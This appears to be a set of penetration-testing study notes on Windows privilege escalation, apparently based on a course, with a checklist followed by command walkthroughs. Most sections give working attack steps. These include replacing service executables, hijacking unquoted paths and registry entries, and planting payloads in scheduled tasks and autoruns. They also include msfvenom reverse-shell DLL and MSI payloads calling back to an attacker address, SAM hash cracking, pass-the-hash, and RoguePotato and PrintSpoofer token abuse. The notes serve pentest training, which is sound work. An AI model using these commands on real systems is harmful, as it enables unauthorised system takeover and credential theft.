---
description: This section is coming straight from Tib3rius Udemy Course.
---

# Privilege Escalation

### Checklist

Reference from [PayloadsAllTheThings](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

### System Info

* [ ] Obtain System information
* [ ] Search for kernel exploits using scripts
* [ ] Use Google to search for kernel exploits
* [ ] Use searchsploit to search for kernel exploits
* [ ] Interesting info in env vars?
* [ ] Passwords in PowerShell history?
* [ ] Interesting info in Internet settings?
* [ ] Drives?
* [ ] WSUS exploit?
* [ ] AlwaysInstallElevated?

### Logging/AV enumeration

* [ ] Check Audit and WEF settings
* [ ] Check LAPS
* [ ] Check if WDigest is active
* [ ] LSA Protection?
* [ ] Credentials Guard?
* [ ] Cached Credentials?
* [ ] Check if any AV
* [ ] AppLocker Policy?
* [ ] UAC
* [ ] User Privileges
* [ ] Check current user privileges
* [ ] Are you member of any privileged group?
* [ ] Check if you have any of these tokens enabled: SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege ?
* [ ] Users Sessions?
* [ ] Check users homes (access?)
* [ ] Check Password Policy
* [ ] What is inside the Clipboard?

### [Network](broken-reference)

* [ ] Check current network information
* [ ] Check hidden local services restricted to the outside

### [Running Processes](broken-reference)

* [ ] Processes binaries file and folders permissions
* [ ] Memory Password mining
* [ ] Insecure GUI apps

### [Services](broken-reference)

* [ ] Can you modify any service?
* [ ] Can you modify the binary that is executed by any service?
* [ ] Can you modify the registry of any service?
* [ ] Can you take advantage of any unquoted service binary path?

### [**Applications**](broken-reference)

* [ ] Write permissions on installed applications
* [ ] Startup Applications
* [ ] Vulnerable Drivers

### [DLL Hijacking](broken-reference)

* [ ] Can you write in any folder inside PATH?
* [ ] Is there any known service binary that tries to load any non-existant DLL?
* [ ] Can you write in any binaries folder?

### [Network](broken-reference)

* [ ] Enumerate the network (shares, interfaces, routes, neighbours, ...)
* [ ] Take a special look at network services listening on localhost (127.0.0.1)

### [Windows Credentials](broken-reference)

* [ ] Winlogon credentials
* [ ] Windows Vault credentials that you could use?
* [ ] Interesting DPAPI credentials?
* [ ] Passwords of saved Wifi networks?
* [ ] Interesting info in saved RDP Connections?
* [ ] Passwords in recently run commands?
* [ ] Remote Desktop Credentials Manager passwords?
* [ ] AppCmd.exe exists? Credentials?
* [ ] SCClient.exe? DLL Side Loading?

### [Files and Registry (Credentials)](broken-reference)

* [ ] Putty: Creds and SSH host keys
* [ ] SSH keys in registry?
* [ ] Passwords in unattended files?
* [ ] Any SAM & SYSTEM backup?
* [ ] Cloud credentials?
* [ ] McAfee SiteList.xml file?
* [ ] Cached GPP Password?
* [ ] Password in IIS Web config file?
* [ ] Interesting info in web logs?
* [ ] Do you want to ask for credentials to the user?
* [ ] Interesting files inside the Recycle Bin?
* [ ] Other registry containing credentials?
* [ ] Inside Browser data (dbs, history, bookmarks, ...)?
* [ ] Generic password search in files and registry
* [ ] Tools to automatically search for passwords

### [Leaked Handlers](broken-reference)

* [ ] Have you access to any handler of a process run by administrator?

### [Pipe Client Impersonation](broken-reference)

* [ ] Check if you can abuse it

### Users

> Enumerating all users on a target machine can help identify potential high-privilege user accounts we could target in an attempt to elevate our privileges.

#### Check user info

```powershell
whoami /all
net user <user_name>
net localgroup administrators
```

`SeImpersonatePrivilege`

`Privileges assigned account missing (restricted set of privileges)`

#### User accounts on the system

```powershell
net users
net localgroups
net group /domain
net group /domain <group_name>
```

### OS Version & Architecture

```powershell
systeminfo
```

`Windows NT LIVDA 6.0 build 6001`

`Windows Server 2008 sp1 32-bit`

### Running Processes & Services

> _“Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well”._

#### Enumeration

**Running processes**

```powershell
tasklist /SVC
```

**Services**

```powershell
sc query <service_name>
accesschk64.exe -uwcqv <user> *
sc qc "service"
```

`IKEEXT`

#### Service Misconfiguration

**Insecure Service Permissions**

> If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!”

Enumerate for vulnerable services (Can change Authenticated Users to other group)

```powershell
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Enumerate for user permisson on a service

```powershell
.\accesschk.exe /accepteula -ucqv <service_name>
```

Then, change service config

```powershell
sc config <service_name> binpath= "C:\Cas\shell.exe"
```

**Unquoted Service Path**

> In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. If we have permission to write a custom file to wither c:\ or c:\Program Files or c:\Program Files\Unquoted Path Service, then we can exploit this vulnerability to gain elevated privileges.

Enumerate for unquoted service paths

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
```

Check user permission on folders:

```powershell
.\accesschk.exe /accepteula -uwdqs users "C:\Program Files\Unquoted Path Service\Common Scripts"
```

```powershell
copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

**Weak Registry Permissions**

> The Windows registry stores entries for each service. Since registry entries can have ACLs(access control lists), if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly. If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then we can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then our program will execute, allowing the us to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Check for permission on registry

```powershell
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

```powershell
reg add <weak_registry> /v ImagePath /t REG_EXPAND_SZ /d C:\Cas\shell.exe /f
```

**Insecure Service Executables**

> If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable

Check for user/group permission on executable file

```powershell
.\accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

```powershell
copy /Y shell.exe "C:\Program Files\File Permissions Service\<insecure-service>"
```

**DLL Hijacking**

> Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll. Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path)

```powershell
Find missing Dlls inside system: [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
```

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my-ip> LPORT=80 -f dll -o reverse.dll
```

### Networking Information

> An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly visible from the original attack machine. We can also investigate port bindings to see if a running service is only available on a loopback address, rather than on a routable one. Investigating a privileged program or service listening on the loopback interface could expand our attack surface and increase our probability of a privilege escalation attack.

#### Full TCP/IP configuration

```powershell
ipconfig /all
```

#### Networking routing tables

```powershell
route print
```

#### Active network connections

```powershell
netstat -ano
```

### Firewall Status and Rules

> For example, if a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system. In addition, we can gather information about inbound and outbound port filtering during this phase to facilitate port forwarding and tunneling when it's time to pivot to an internal network.

#### Firewall profile

```powershell
netsh advfirewall show currentprofile
```

#### Firewall rules

```powershell
netsh advfirewall firewall show rule name=all
```

### Scheduled Tasks

List all scheduled tasks

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
```

> Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

```
Let’s append shell.exe to this script to get back reverse shell on machine
```

```powershell
echo C:\Cas\shell.exe >> C:\<path-scheduled-tasks>
```

### Installed Applications and Patch Levels

#### Enumeration

List applications (use Windows Installer)

```powershell
wmic product get name, version, vendor
```

List system-wide updates

```powershell
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

`Sticky Notes`

`Foxit Software`

`LAPS`

`PaperStream IP`

`Remote Mouse`

**Insecure GUI Apps**

> On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. We call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

#### Startup Apps

> Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

```
Add a startup script to this directory upon script execution
```

### Readable/Writable Files & Directories

> This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account.

```powershell
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

### Unmounted Disks

> On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.

```powershell
mountvol
```

### Device Drivers and Kernel Modules

#### List of drivers and kernel modules

```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

#### Version of loaded driver

```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

### Binaries That AutoElevate (Registry)

#### AutoRuns

> Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges

```powershell
copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
```

#### AlwaysInstallElevated

> The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work. MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

Generate a new reverse shell with msi extension

```powershell
msfvenom -p windows/x64/shell_reverse_tcp lhost=<my-ip> lport=443 -f msi -o shell.msi
```

```powershell
msiexec /quiet /qn /i shell.msi
```

### Passwords

#### Registry

> Registry — “Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.”

#### Saved Creds

> Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

```powershell
cmdkey /list
```

```powershell
runas /savecred /user:<user_name> shell.exe
```

#### Security Account Manager (SAM)

> “Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.”

```
The SAM and SYSTEM files:  `C:\\Windows\System32\config `
Backups of the files may exist: `C:\\Windows\\Repair` or `C:\\Windows\\System32\\config\\RegBack `
Extract the hash using ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’
Use hashcat to crack hash
```

```powershell
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

#### Passing the Hash

> Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash

```powershell
pth-winexe -U '<NTLM hash>' //<IP> cmd.exe
```

### Token Impersonation

#### Rogue Potato

> If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato

Get reverse shell of local service

```powershell
PsExec64.exe -i -u "nt authority\local service" C:\Cas\shell.exe
```

_“If you have SeAssignPrimaryToken or SeImpersonateprivilege, you are SYSTEM”_

```powershell
.\RoguePotato.exe -r <remote-host> -e "C:\Cas\shell.exe" -l 443
```

#### PrintSpoofer

```powershell
PrintSpoofer.exe -c shell.exe -i
```

### Automated Enumeration

* _windows-privesc-check_
* _winPEASany\_ofs.exe_
